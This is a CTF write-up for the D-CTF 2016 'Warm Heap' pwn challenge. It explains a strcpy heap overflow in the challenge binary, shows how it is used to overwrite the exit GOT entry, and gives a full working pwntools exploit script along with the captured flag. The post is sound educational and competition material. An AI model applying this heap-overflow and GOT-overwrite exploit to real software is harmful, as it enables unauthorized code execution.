---
layout: post
title: "D-CTF Qualifiers 2016: Warm Heap (Exploit 100)"
author: f0rki
categories: writeup
tags: [cat/pwn, tool/pwntools, tool/ltrace]
---

* **Category:** Exploit
* **Points:** 100
* **Description:**

> 10.13.37.21:1337
> https://dctf.def.camp/quals-2016/exp100.bin

## Write-up

This is a pretty straight forward heap based buffer overflow. It's pretty easy
to reverse the main function and we can see the rather obvious `strcpy` buffer
overflows. I wrote the main function down in pseudo-C:

```
struct foo {
    int64 count;
    void* ptr;
};

struct foo* a = malloc(16); // rbp-0x1020
a.count = 1;
a.ptr = malloc(8);
struct foo* b = malloc(16); // rbp-0x1018
b.count = 2;
b.ptr = malloc(8);

char buf[0x1000];

fgets(buf, 0x1000, stdin);
strcpy(a.ptr, buf);
fgets(buf, 0x1000, stdin);
strcpy(b.ptr, buf);
exit();
```

The first version of the binary was by accident hardened with `FORTIFY_SOURCE`
so the `strcpy` where `__strcpy_chk` calls with a limit of 8.
Fortunately they fixed that pretty soon, although I lost some time looking at
the non-exploitable version.

Since this is a heap based overflow I like to gain a quick overview of the
allocations by using `ltrace -e 'malloc+free'`, e.g.:

```
malloc(16)             = 0x8d6010
malloc(8)              = 0x8d6030
malloc(16)             = 0x8d6050
malloc(8)              = 0x8d6070
```

So we can see that `b.ptr` is allocated `0x20` bytes before `b` and `b.ptr` is
used as the target of the second `strcpy`. We can abuse this to overwrite and
arbitrary address, with data we supply. To redirect control flow we need a code
pointer that is writable, at a fixed address to bypass ASLR and is used after
we corrupted it. Fortunatly the `GOT` entry of `exit` fits all those criteria.

1. Use first `strcpy` call to overwrite `b.ptr` with `got.exit`
2. Use second `strcpy` to write an arbitrary address to `got.exit`
3. We control the target of the call to `exit` and redirect to the flag reading
   function at `0x00400826`


Here is the full exploit. I used the debugger and a cyclic pattern to determine
the offset from `a.ptr` to `b`, because I was too lazy to calculate it.

The flag was `DCTF{b94c21ff7531cba35a498cb074918b3e}`


```python
#!/usr/bin/env python

from pwn import *

velf = ELF("./exp100.bin")
# vlibc = ELF("../libc/lib/x86_64-linux-gnu/libc-2.23.so")
# use the ubuntu libs
env = {"LD_LIBRARY_PATH": "../libc/lib/x86_64-linux-gnu/"}
DEBUG = False
# DEBUG = True
if DEBUG:
    vp = process("./exp100.bin", env=env)
    gdb.attach(vp, execute="""
# init-pwndbg
init-peda
# first strcpy
break *0x0040096e
# second strcpy
break *0x004009a6
# exit
break *0x004009b0
""")
else:
    vp = remote("10.13.37.21", 1337)

read_flag_addr = 0x00400826
exit_got_addr = velf.got['exit']

# c = cyclic(0x1000*2, n=8)
# vp.sendline(c[:0x1000])
# vp.sendline(c[0x1000:])
off = cyclic_find("faaaaaaa", n=8)

with context.local(log_level="debug"):
    vp.sendline("A" * off + p64(exit_got_addr))
    vp.sendline(p64(read_flag_addr))
    vp.clean_and_log()

vp.interactive()

vp.close()
```
